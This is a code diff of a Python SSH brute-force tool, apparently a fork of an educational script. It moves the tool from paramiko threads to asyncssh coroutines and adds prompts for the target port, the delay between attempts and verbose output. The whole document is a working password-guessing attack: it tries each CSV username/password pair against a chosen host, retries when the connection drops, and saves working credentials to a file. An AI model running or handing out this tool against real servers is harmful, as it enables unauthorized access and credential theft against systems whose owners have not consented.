@@ -1,33 +1,31 @@
 import csv
 import ipaddress
-import threading
+import asyncssh
+import asyncio
 import time
-import logging
-from logging import NullHandler
-from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
+import sys
 
-
-# This function is responsible for the ssh client connecting.
-def ssh_connect(host, username, password):
-    ssh_client = SSHClient()
-    # Set the host policies. We add the new hostname and new host key to the local HostKeys object.
-    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
+async def ssh_connect(HOST, PORT, username, password, FLAG):
+            
     try:
-        # We attempt to connect to the host, on port 22 which is ssh, with password, and username that was read from the csv file.
-        ssh_client.connect(host,port=22,username=username, password=password, banner_timeout=300)
-        # If it didn't throw an exception, we know the credentials were successful, so we write it to a file.
-        with open("credentials_found.txt", "a") as fh:
-            # We write the credentials that worked to a file.
-            print(f"Username - {username} and Password - {password} found.")
-            fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
-    except AuthenticationException:
-        print(f"Username - {username} and Password - {password} is Incorrect.")
-    except ssh_exception.SSHException:
-        print("**** Attempting to connect - Rate limiting on server ****")
+        async with asyncssh.connect(HOST, port=PORT, username=username, password=password):
+            print(f"(!!!) Username - {username} and Password - {password} found.")
+            # Save found credentials
+            with open("credentials_found.txt", "a") as file:
+                file.write(f"Username: {username}\nPassword: {password}\nWorked on host {HOST}\n")
 
-# This function gets a valid IP address from the user. 
+    except asyncssh.misc.PermissionDenied:
+        if FLAG == 'true':
+            print(f"Username - {username} and Password - {password} is Incorrect.")
+    except asyncssh.misc.ConnectionLost:
+        print("**** Attempting to connect - Rate limiting on server ****")
+        await ssh_connect(HOST, PORT, username, password, FLAG)
+    except ConnectionResetError:
+        sys.exit('Server\'s reset connection! Try to change delay! ----')
+            
+
+# This function gets a valid IP address from the user.  =============================
 def get_ip_address():
-    # We create a while loop, that we'll break out of only once we've received a valid IP Address.
     while True:
         host = input("Please enter the host ip address: ")
         try:
@@ -35,35 +33,89 @@ def get_ip_address():
             ipaddress.IPv4Address(host)
             return host
         except ipaddress.AddressValueError:
-            # If host is not a valid IPv4 address we send the message that the user should enter a valid ip address.
             print("Please enter a valid ip address.")
-            
-        
 
-# The program will start in the main function.
-def __main__():
-    logging.getLogger('paramiko.transport').addHandler(NullHandler())
-    # To keep to functional programming standards we declare ssh_port inside a function.
-    list_file="passwords.csv"
-    host = get_ip_address()
-    # This function reads a csv file with passwords.
-    with open(list_file) as fh:
+# This function gets a valid SSH port from the user.  ===============================
+def get_port():
+    while True:
+        port = input("Please enter the SSH port: ")
+        try:
+            # Check if SSH port is a valid one. If so we return port.
+            port = int(port)
+            return port
+        except Exception:
+            print("Please enter a valid port.")
+
+# This function gets a valid delay from the user.  =================================
+def get_delay():
+    while True:
+        delay = input("Please enter delay between connections (sec): ")
+        try:
+            # Check if delay is valied. If so we return delay.
+            delay = float(delay)
+            return delay
+        except Exception:
+            print("Please enter a valid delay.")
+    
+# Main loop =========================================================================
+async def __main__():
+
+    banner = """                             
+    _____ _____ _   _                                                             
+    /  ___/  ___| | | |                                                            
+    \ `--.\ `--.| |_| |   forked from David Bombal => Check his YT channel                                                         
+     `--. \`--. \  _  |   by wannebetheshy                                                         
+    /\__/ /\__/ / | | |   v 1.0                                                         
+    \____/\____/\_| |_/        path to ethical hacker?                                                    
+      ___                        ______            _        ______                 
+     / _ \                       | ___ \          | |       |  ___|                
+    / /_\ \___ _   _ _ __   ___  | |_/ /_ __ _   _| |_ ___  | |_ ___  _ __ ___ ___ 
+    |  _  / __| | | | '_ \ / __| | ___ \ '__| | | | __/ _ \ |  _/ _ \| '__/ __/ _ \\
+    | | | \__ \ |_| | | | | (__  | |_/ / |  | |_| | ||  __/ | || (_) | | | (_|  __/
+    \_| |_/___/\__, |_| |_|\___| \____/|_|   \__,_|\__\___| \_| \___/|_|  \___\___|
+                __/ |                                                              
+               |___/                                                               
+                                        
+    """
+    
+    # just decoration stuff :)
+    for line in banner.split('\n'):
+        print(line)
+        time.sleep(0.05)
+
+    coroutines_list = []
+    
+    HOST = get_ip_address()
+    PORT = get_port()
+    LIST_FILE= input('Path to *.csv file to read credentials from: ')
+    DELAY = get_delay()
+    FLAG = input('Show incorrect result? (True/False = false default): ').lower()
+
+    print('Opening credentials file...')
+    with open(LIST_FILE) as fh:
         csv_reader = csv.reader(fh, delimiter=",")
-        # We use the enumerate() on the csv_reader object. This allows us to access the index and the data.
+
+        print('Generating asynchronous tasks...')
         for index, row in enumerate(csv_reader):
+            
             # The 0 index is where the headings are allocated.
             if index == 0:
                 continue
-            else:
-                #  We create a thread on the ssh_connect function, and send the correct arguments to it.
-                t = threading.Thread(target=ssh_connect, args=(host, row[0], row[1],))
-                # We start the thread.
-                t.start()
-                # We leave a small time between starting a new connection thread.
-                time.sleep(0.2)
-                # ssh_connect(host, ssh_port, row[0], row[1])
-
             
+            # Skip empty rows
+            if row == []:
+                continue
+        
+            # adding i/o tasks for asynchronous executing
+            coroutines_list.append(asyncio.create_task(ssh_connect(HOST, PORT, row[0], row[1], FLAG)))
+        
+            # we leave a small time between starting a new connection because of server reset error.
+            await asyncio.sleep(delay=DELAY)
 
-#  We run the main function where execution starts.
-__main__()
+        print('Waiting for remaining answers...')        
+        await asyncio.gather(*coroutines_list)
+        print('File "credentials_found.txt" was successfuly written')
+
+# We check if program doesn't start from elsewhere
+if __name__ == '__main__':
+    asyncio.run(__main__())
